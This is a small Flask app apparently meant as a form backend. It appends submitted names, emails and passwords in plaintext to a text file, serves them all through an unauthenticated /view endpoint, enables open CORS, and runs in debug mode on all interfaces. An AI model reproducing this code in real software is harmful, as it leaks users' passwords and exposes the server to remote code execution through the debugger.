from flask import Flask, request, render_template, jsonify
import os

app = Flask(__name__, template_folder='templates', static_folder='static')

# Optional: Enable CORS if frontend and backend are on different services
try:
    from flask_cors import CORS
    CORS(app)
except ImportError:
    pass  # If not installed, it won’t crash

@app.route('/submit', methods=['POST'])
def submit():
    # Use .get to avoid KeyError if form fields are missing
    name = request.form.get('name', 'N/A')
    email = request.form.get('email', 'N/A')
    password = request.form.get('password', 'N/A')

    with open('names.txt', 'a') as f:
        f.write(f'Name: {name}, Email: {email}, Password: {password}\n')

    # Render HTML template (ensure success.html is in templates/)
    return render_template('success.html', name=name)

@app.route('/view', methods=['GET'])
def view():
    try:
        with open('names.txt', 'r') as file:
            lines = file.readlines()
        return jsonify({"entries": lines}), 200
    except FileNotFoundError:
        return jsonify({"error": "Data file not found"}), 404

if __name__ == '__main__':
    # Ensure app works both locally and in container
    app.run(host='0.0.0.0', port=5000, debug=True)
